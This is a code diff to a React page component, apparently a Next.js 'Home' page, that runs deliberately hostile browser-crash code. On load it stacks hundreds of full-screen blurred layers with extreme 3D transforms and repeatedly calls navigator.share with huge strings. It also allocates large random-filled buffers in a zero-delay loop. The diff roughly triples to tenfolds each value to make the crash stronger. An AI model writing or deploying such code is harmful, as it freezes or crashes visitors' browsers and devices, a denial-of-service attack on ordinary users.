@@ -5,18 +5,18 @@ export default function Home() {
   useEffect(() => {
     const cont = document.getElementById('cont')
     const container = document.createElement('div')
-    container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;'
+    container.style.cssText = 'perspective: 1px; perspective-origin: 99999999% 99999999%;'
     cont?.appendChild(container)
-    for (let i = 0; i < 500; i++) {
+    for (let i = 0; i < 1500; i++) {
       let d = document.createElement('div');
-      d.style.cssText = 'pointer-events: none; position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+      d.style.cssText = 'pointer-events: none; position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(1000000px, 1000000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
       container?.appendChild(d);
     }
     setInterval(() => {
       try {
-        navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+        navigator.share({ title: 'R', text: 'R'.repeat(1000000) });
       } catch(e) {}
-      let x = new Uint8Array(1024 * 1024 * 20);
+      let x = new Uint8Array(2048 * 2048 * 67);
       crypto.getRandomValues(x);
     }, 0);
   })
